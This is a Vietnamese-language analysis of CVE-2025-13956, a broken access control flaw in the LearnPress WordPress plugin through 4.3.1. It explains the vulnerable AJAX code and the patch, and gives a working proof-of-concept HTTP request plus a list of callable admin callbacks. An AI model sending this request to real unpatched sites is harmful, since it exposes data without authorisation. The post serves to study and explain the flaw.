# CVE-2025-13956 Analysis & POC


<!--more-->

## CVE & Basic Info
Plugin **LearnPress – WordPress LMS Plugin** cho **WordPress** bị **lỗ hổng truy cập trái phép dữ liệu** do **thiếu kiểm tra quyền (capability check)** trong **chức năng thống kê** ở **tất cả các phiên bản đến và bao gồm 4.3.1**. Điều này cho phép **kẻ tấn công chưa xác thực** xem **thống kê đơn hàng** của plugin, bao gồm **tổng doanh thu** và **số lượng trạng thái đơn hàng**.

* **CVE ID**: [CVE-2025-13956](https://www.cve.org/CVERecord?id=CVE-2025-13956)
* **Vulnerability Type**: Broken Access Control
* **Affected Versions**: <= 4.3.1
* **Patched Versions**: 4.3.2
* **CVSS severity**: Low (5.3)
* **Required Privilege**: Unauthenticated
* **Product**: [WordPress LearnPress Plugin](https://wordpress.org/plugins/learnpress/)

## Requirements
* **Local WordPress & Debugging**
    * [Virtual Machine](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/)
    * [Docker](https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/)
* **Plugin Version** - **LearnPress**:  
    * `4.3.1` – **vulnerable**  
    * `4.3.2` – **patched**
* **Diff Tool (diff)** → [**Meld**](https://meldmerge.org/) hoặc bất kỳ công cụ diff nào.

## Analysis 
Plugin đã đăng ký action hook:

```php {title="learnpress.php v4.3.1" data-open=true hl_lines=[2,4]}
add_action(
  'init',
  function () {
    LoadContentViaAjax::catch_lp_ajax();
    LessonAjax::catch_lp_ajax();
    EditCurriculumAjax::catch_lp_ajax();
    EditQuizAjax::catch_lp_ajax();
    EditQuestionAjax::catch_lp_ajax();
    SendEmailAjax::catch_lp_ajax();
    OpenAiAjax::catch_lp_ajax();

    do_action( 'learn-press/register-ajax-handlers' );
  },
  11
);
```

`init` hook là hook khởi tạo sớm của WordPress, được chạy sau khi WordPress tải xong các thành phần cốt lõi nhưng trước khi gửi output ra trình duyệt => Bất kì request của bất kỳ user nào cũng kích hoạt được. 

`function () {}` là hàm ẩn danh được đặt làm callback cho hook này.

Ở dòng thứ 4, hàm tĩnh `LoadContentViaAjax:catch_lp_ajax()` được gọi từ class `LoadContentViaAjax`:

```php {title="AbstractAjax.php v4.3.1" data-open=true hl_lines=[6,7,12,21,28]}
class LoadContentViaAjax extends AbstractAjax { ... }

abstract class AbstractAjax {
	public static function catch_lp_ajax() {
		if ( ! empty( $_REQUEST['lp-load-ajax'] ) ) {
			$action = $_REQUEST['lp-load-ajax'];
			$nonce  = $_REQUEST['nonce'] ?? '';
			$class  = new static();

			// For case cache html, so cache nonce is not required.
			$class_no_nonce = [
				LoadContentViaAjax::class,
			];

			if ( ! wp_verify_nonce( $nonce, 'wp_rest' ) ) {
				if ( ! in_array( get_class( $class ), $class_no_nonce ) ) {
					wp_die( 'Invalid request!', 400 );
				} else {
					// Allow to handle without nonce, but must same domain.
					$referer = wp_get_referer();
					if ( empty( $referer ) || strpos( $referer, home_url() ) !== 0 ) {
						wp_die( 'Invalid request!', 400 );
					}
				}
			}

			if ( is_callable( [ $class, $action ] ) ) {
				call_user_func( [ $class, $action ] );
			}
		}
	}
}
```

1. **Class kế thừa**

   ```php
   class LoadContentViaAjax extends AbstractAjax
   ```

   → `LoadContentViaAjax` kế thừa toàn bộ logic xử lý AJAX từ `AbstractAjax`.

2. **Hook `init` gọi `catch_lp_ajax()`**

   * Khi WordPress chạy tới hook `init`
   * `LoadContentViaAjax::catch_lp_ajax()` được thực thi.

3. **Kiểm tra request**

   ```php
   if ( ! empty( $_REQUEST['lp-load-ajax'] ) )
   ```

   → Chỉ xử lý khi request có tham số `lp-load-ajax`.

4. **Xác định hành động**

   ```php
   $action = $_REQUEST['lp-load-ajax'];
   ```

   → Giá trị này được coi là **tên method** sẽ được gọi trong class con.

5. **Khởi tạo object**

   ```php
   $class = new static();
   ```

   → `static` trỏ tới class đang gọi (`LoadContentViaAjax`), nên tạo instance của class đó.

6. **Xử lý nonce**

   * Lấy `nonce` từ request
   * Kiểm tra bằng `wp_verify_nonce`
   * Riêng `LoadContentViaAjax` được phép **bỏ qua nonce**
   * Khi bỏ qua nonce thì kiểm tra `referer` cùng domain.

7. **Gọi method tương ứng**

   ```php
   if ( is_callable( [ $class, $action ] ) ) {
       call_user_func( [ $class, $action ] );
   }
   ```

   → Nếu trong `LoadContentViaAjax` có method trùng tên với giá trị `lp-load-ajax`
   → Method đó sẽ được gọi và thực thi.

```php {title="AbstractAjax.php v4.3.1" data-open=true hl_lines=[6,19,20,27,28,31,42]}
class LoadContentViaAjax extends AbstractAjax {
	public function load_content_via_ajax() {
		$response = new LP_REST_Response();

		try {
			$params = wp_unslash( $_REQUEST['data'] ?? '' );
			if ( empty( $params ) ) {
				throw new Exception( 'Error: params invalid!' );
			}

			$params = LP_Helper::json_decode( $params, true );

			if ( empty( $params['callback'] ) ||
				! isset( $params['args'] ) ) {
				throw new Exception( 'Error: params invalid!' );
			}

			// @var array $args
			$args     = $params['args'];
			$callBack = $params['callback'];

			if ( empty( $callBack['class'] ) ||
				empty( $callBack['method'] ) ) {
				throw new Exception( 'Error: callback invalid!' );
			}

			$class  = $callBack['class'];
			$method = $callBack['method'];

			// Security: check callback is registered.
			$allow_callbacks = apply_filters(
				'lp/rest/ajax/allow_callback',
				[]
			);
			$callBackStr     = $class . ':' . $method;
			if ( ! in_array( $callBackStr, $allow_callbacks ) ) {
				throw new Exception( 'Error: callback is not register!' );
			}

			// Check class and method is callable.
			if ( is_callable( [ $class, $method ] ) ) {
				$data = call_user_func( [ $class, $method ], $args );
			} else {
				throw new Exception( 'Error: callback is not callable!' );
			}

			if ( ! $data instanceof stdClass && ! isset( $data->content ) ) {
				throw new Exception( 'Error: data content invalid!' );
			}

			$response->message = $data->message ?? '';
			unset( $data->message );

			$response->status = 'success';
			$response->data   = $data;
		} catch ( Throwable $e ) {
			$response->status  = 'error';
			$response->message = $e->getMessage();
		}

		wp_send_json( $response );
	}
}
```

Các biến cần thiết cho `call_user_func` được hình thành trực tiếp từ chính đoạn code này và liên kết với nhau theo đúng luồng xử lý:

```php
$params = LP_Helper::json_decode( $params, true );
```

Biến `$params` là mảng dữ liệu đầu vào sau khi giải mã JSON từ request, trong đó bắt buộc phải có thông tin callback và tham số.

```php
$args     = $params['args'];
$callBack = $params['callback'];
```

`$args` chứa các tham số sẽ được truyền vào hàm được gọi, còn `$callBack` mô tả callback cần thực thi.

```php
$class  = $callBack['class'];
$method = $callBack['method'];
```

Hai biến này xác định chính xác **class** và **phương thức** sẽ được gọi động.

```php
$callBackStr = $class . ':' . $method;
```

Chuỗi này được dùng để đối chiếu với danh sách callback được phép trong `$allow_callbacks`.

Hàng loạt các callback được đăng ký cho filter `lp/rest/ajax/allow_callback` thông qua hàm `add_filter`:

![Filter](https://w41bu1.github.io/posts/2025-12-11-cve-2025-11368/filter.png "Đăng ký callback cho filter lp/rest/ajax/allow_callback")

```php
public function allow_callback( array $callbacks ): array {
  $callbacks[] = get_class( $this ) . ':render_edit_quiz';
  $callbacks[] = get_class( $this ) . ':render_list_items_not_assign';

  return $callbacks;
}
```

Hàm nhận mảng `$callbacks` hiện có, sau đó thêm vào hai chuỗi dạng `TênClass:method` của class hiện tại, rồi trả lại mảng đó để WordPress sử dụng làm danh sách callback hợp lệ. Khi debug, ta sẽ thấy toàn bộ các callback được đăng ký:

![Allow](https://w41bu1.github.io/posts/2025-12-11-cve-2025-11368/allow.png "Danh sách các callback hợp lệ")

```php
if ( is_callable( [ $class, $method ] ) ) {
    $data = call_user_func( [ $class, $method ], $args );
}
```

Mảng `[ $class, $method ]` chính là callback hợp lệ mà `call_user_func` yêu cầu. Khi điều kiện `is_callable` đúng, WordPress sẽ gọi phương thức `$method` của class `$class` và truyền biến `$args` làm tham số duy nhất cho phương thức đó.

> [!BUG]
> **Lỗ hổng phát sinh do API không thực hiện bất kỳ kiểm tra quyền (capability/permission) nào.** Điều này cho phép mọi người dùng – kể cả không có quyền quản trị – gọi vào endpoint và yêu cầu thực thi bất kỳ callback nào nằm trong danh sách callback hợp lệ, dù những callback đó lẽ ra chỉ dành cho admin.

**Bản vá (v4.3.2)** bổ sung vào hàm `load_content_via_ajax` bước xác thực quyền bằng cách cố định danh sách callback được phép gọi:

```php
$allow_callbacks = apply_filters(
    'lp/rest/ajax/allow_callback',
    [
        'LP_Admin_Dashboard:order_statistic',
        'LP_Admin_Dashboard:plugin_status_content',
    ]
);
```

Chỉ những callback có tên class và method khớp chính xác với `'LP_Admin_Dashboard:order_statistic'` hoặc `'LP_Admin_Dashboard:plugin_status_content'` mới vượt qua được kiểm tra.

Hàm `order_statistic` và `plugin_status_content` đều có cơ chế kiểm tra quyền Administrator trước khi thực thi:

```php
if ( ! current_user_can( UserModel::ROLE_ADMINISTRATOR ) ) {
  wp_die( esc_html__( 'You do not have sufficient permissions to access this page.', 'learnpress' ) );
}
```

Nhờ đó lỗ hổng đã được khoá chặt.

## Flow
{{< mermaid >}}
flowchart TD

A["Unauthenticated attacker"]
--> B["Send request with lp-load-ajax parameter"]
B --> C["LoadContentViaAjax::catch_lp_ajax() triggered via init hook"]
C --> D["Check lp-load-ajax parameter exists"]
D --> E["Create instance of LoadContentViaAjax"]
E --> F["Class in $class_no_nonce whitelist → Skip nonce check"]
F --> G["Retrieve $class and $method from request data"]
G --> H["Check if $class:$method is in $allow_callbacks (all callbacks allowed)"]
H --> I["is_callable([class, method])?"]
I -->|Yes| J["Execute callback via call_user_func([class, method], args)"]
J --> K["Sensitive admin-only data returned to attacker"]

{{< /mermaid >}}

## Proof of Concept (PoC)
Gửi request với Unauthenticated user:

```http
POST / HTTP/1.1
Host: localhost
Referer: http://localhost

lp-load-ajax=load_content_via_ajax&data={"callback":{"class":"LearnPress\\TemplateHooks\\Admin\\AdminEditQizTemplate","method":"render_list_items_not_assign"},"args":{"quiz_id":483}}
```

![Result](https://w41bu1.github.io/posts/2025-12-11-cve-2025-11368/result.png "Kết quả")

**Danh sách các callback hợp lệ khác:**

```php {data-open=true}
LearnPress\TemplateHooks\Course\ListCoursesTemplate:render_courses
LearnPress\TemplateHooks\Course\ListCoursesRelatedTemplate:render_courses
LearnPress\TemplateHooks\Course\SingleCourseTemplate:render_html_comments
LearnPress\TemplateHooks\Profile\ProfileQuizzesTemplate:renderContent
LearnPress\TemplateHooks\Course\AdminEditCurriculumTemplate:render_edit_course_curriculum
LearnPress\TemplateHooks\Course\AdminEditCurriculumTemplate:render_list_items_not_assign
LearnPress\TemplateHooks\Admin\AdminEditQizTemplate:render_edit_quiz
LearnPress\TemplateHooks\Admin\AdminEditQizTemplate:render_list_items_not_assign
LearnPress\TemplateHooks\Admin\AdminEditQuestionTemplate:render_edit_question
LearnPress\TemplateHooks\Course\CourseMaterialTemplate:render_material_items
LearnPress\ExternalPlugin\Elementor\Widgets\Course\Skins\CoursesGrid:render_courses
LearnPress\ExternalPlugin\Elementor\Widgets\Course\Skins\CoursesList:render_courses
LearnPress\ExternalPlugin\Elementor\Widgets\Course\Skins\CoursesLoopItem:render_courses
LearnPress\Gutenberg\Blocks\Courses\ListCoursesBlockType:render_courses
```

## Conclusion

Lỗ hổng **Broken Access Control** trong LearnPress <= 4.3.1 cho phép **kẻ tấn công chưa xác thực** thực thi các callback AJAX vốn chỉ dành cho admin. Vấn đề phát sinh do API không kiểm tra **capability/permission** trước khi gọi `call_user_func([class, method], args)`. Bản vá 4.3.2 đã giới hạn callback hợp lệ và yêu cầu quyền Administrator, ngăn chặn truy cập trái phép.

## Key Takeaways

* Không bao giờ cho phép callback động thực thi mà không kiểm tra quyền.
* `lp-load-ajax` endpoint có thể trở thành lỗ hổng nếu danh sách callback không bị giới hạn.
* Luôn xác thực `nonce` hoặc kiểm tra **referer/domain** để giảm rủi ro từ request không hợp lệ.
* Bản vá cần **cố định danh sách callback** và kết hợp với kiểm tra quyền admin cho các chức năng nhạy cảm.
* Broken Access Control thường phát sinh ở các API AJAX/REST khi lập trình viên tin tưởng dữ liệu đầu vào từ client.

## References
[Broken Access Control](https://patchstack.com/academy/wordpress/vulnerabilities/broken-access-control/)

[WordPress LearnPress Plugin <= 4.3.1 is vulnerable to Broken Access Control](https://patchstack.com/database/wordpress/plugin/learnpress/vulnerability/wordpress-learnpress-wordpress-lms-plugin-plugin-4-3-1-missing-authorization-to-unauthenticated-orders-statistics-exposure-vulnerability)  

---

> Tác giả: [Bui Van Y](github.com/w41bu1)  
> URL: http://localhost:1313/vi/posts/2025-12-16-cve-2025-13956/  

